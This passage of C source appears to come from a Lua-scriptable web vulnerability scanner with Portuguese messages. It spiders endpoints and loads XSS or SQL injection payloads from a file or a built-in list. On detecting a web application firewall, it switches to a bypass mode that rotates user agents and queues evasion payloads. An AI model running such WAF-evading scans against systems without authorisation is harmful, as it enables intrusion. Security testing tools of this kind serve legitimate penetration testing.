            lua_pushinteger(L, 0); break; \
        } \
        /* Aplica limite: 0=todos, N=primeiros N */ \
        int _tc_limited = (_ep_limit <= 0 || _ep_limit >= _tc) ? _tc : _ep_limit; \
        printf("\033[1;33m[*] Spider — %d endpoint(s) encontrado(s):\033[0m\n", _tc); \
        for (int _pi=0; _pi<_tc; _pi++) { \
            if (_pi < _tc_limited) \
                printf("    \033[1;32m[%d] %s\033[0m\n", _pi+1, _ts[_pi]); \
            else \
                printf("    \033[0;90m[%d] %s  (skip)\033[0m\n", _pi+1, _ts[_pi]); \
        } \
        if (_tc_limited < _tc) \
            printf("\033[0;90m[*] Testando %d/%d — mod.%s(url,nil,0) para testar todos\033[0m\n\n", _tc_limited, _tc, summary_name); \
        else \
            printf("\n"); \
        _tc = _tc_limited; \
    } else { \
        _single_target[0] = (char*)_u; \
        _ts = _single_target; \
        _tc = 1; \
    } \
    \
    /* Carrega payloads (arquivo ou builtin) — UMA VEZ para todos os endpoints */ \
    const char *_custom_file = luaL_optstring(L, 2, NULL); \
    char **_use_payloads = NULL; int _use_count = 0; int _from_file = 0; \
    if (_custom_file && strlen(_custom_file) > 0) { \
        int _fc2 = 0; char **_fa2 = load_payloads_file(_custom_file, &_fc2); \
        if (_fa2 && _fc2 > 0) { _use_payloads = _fa2; _use_count = _fc2; _from_file = 1; } \
        else printf("\033[1;31m[!] Arquivo não encontrado: %s — usando padrão\033[0m\n", _custom_file); \
    } \
    if (!_from_file) { \
        _use_count = builtin_count; \
        _use_payloads = (char**)malloc(sizeof(char*) * _use_count); \
        if (_use_payloads) \
            for (int _pi=0; _pi<_use_count; _pi++) _use_payloads[_pi] = (char*)(builtin_arr[_pi]); \
    } \
    \
    /* Reseta contador global e acumula hits de TODOS os endpoints */ \
    MOD_RESET(); \
    int _grand_total = 0; \
    int _grand_payloads = 0; \
    int _grand_payloads_hits = 0; \
    \
    /* Itera cada endpoint */ \
    for (int _ei = 0; _ei < _tc && _use_payloads; _ei++) { \
        const char *_etarget = _ts[_ei]; \
        printf("\n\033[1;" banner_color "m╔═══════════════════════════════════════╗\033[0m\n"); \
        printf("\033[1;" banner_color "m║  %-39s║\033[0m\n", label); \
        printf("\033[1;" banner_color "m╚═══════════════════════════════════════╝\033[0m\n\n"); \
        printf("\033[1;33m[*] Target: %s\033[0m\n", _etarget); \
        if (_tc > 1) printf("\033[0;90m[*] Endpoint %d/%d\033[0m\n", _ei+1, _tc); \
        if (_from_file) \
            printf("\033[1;36m[*] Payloads: %d (arquivo: %s)\033[0m\n\n", _use_count, _custom_file); \
        else \
            printf("\033[1;33m[*] Payloads: %d (padrão) em paralelo...\033[0m\n\n", _use_count); \
        \
        /* ── WAF Detection ── */ \
        printf("\033[0;90m[*] Detectando firewall...\033[0m\n"); \
        WafType _waf = waf_detect(_etarget); \
        printf("\033[1m┌─ Firewall ─────────────────────────────────────────────┐\033[0m\n"); \
        if (_waf != WAF_NONE) { \
            printf("\033[1m│\033[0m  \033[1;31m[+] Detectado: %-38s\033[0m\033[1m│\033[0m\n", waf_name(_waf)); \
            printf("\033[1m│\033[0m  \033[1;33m[*] Modo bypass ativado automaticamente          \033[1m│\033[0m\n"); \
            printf("\033[1m│\033[0m  \033[0;90m[*] User-Agent rotacionado a cada request        \033[0;90m\033[1m│\033[0m\n"); \
        } else { \
            printf("\033[1m│\033[0m  \033[1;32m[✓] Nenhum WAF detectado                         \033[1m│\033[0m\n"); \
        } \
        printf("\033[1m└────────────────────────────────────────────────────────┘\033[0m\n\n"); \
        \
        /* ── Fila inteligente: se WAF detectado, prefixa bypasses ── */ \
        char **_final_payloads = _use_payloads; \
        int _final_count = _use_count; \
        int _sorted_alloc = 0; \
        if (_waf != WAF_NONE && !_from_file) { \
            const char **_bp = NULL; \
            /* Seleciona bypasses pelo tipo de scanner */ \
            if (strstr(summary_name,"XSS") || strstr(summary_name,"Cross")) \
                _bp = waf_bypass_xss; \
            else if (strstr(summary_name,"SQL") || strstr(summary_name,"SQLi")) \
                _bp = waf_bypass_sqli; \
            if (_bp) { \
                _final_payloads = waf_sort_payloads(_use_payloads, _use_count, _bp, &_final_count); \
                _sorted_alloc = (_final_payloads != _use_payloads); \
                printf("\033[1;36m[WAF] %d payloads de bypass adicionados à fila\033[0m\n\n", _final_count - _use_count); \
            } \
        } \
        \
        /* Baseline para este endpoint */ \
        size_t _bl = 0; \
        { const char *_blv[] = {"1","test","a",NULL}; \
          for (int _bi=0; _blv[_bi]; _bi++) { \
            char _blu[1100]; snprintf(_blu,sizeof(_blu),"%s%s",_etarget,_blv[_bi]); \
            CURL *_blc = curl_easy_init(); \
            if (_blc) { \
                WorkBuf _blwb={0}; _blwb.buf=malloc(131072); _blwb.cap=131072; \
                curl_easy_setopt(_blc,CURLOPT_URL,_blu); \
                curl_easy_setopt(_blc,CURLOPT_WRITEFUNCTION,worker_write_cb); \
                curl_easy_setopt(_blc,CURLOPT_WRITEDATA,&_blwb); \
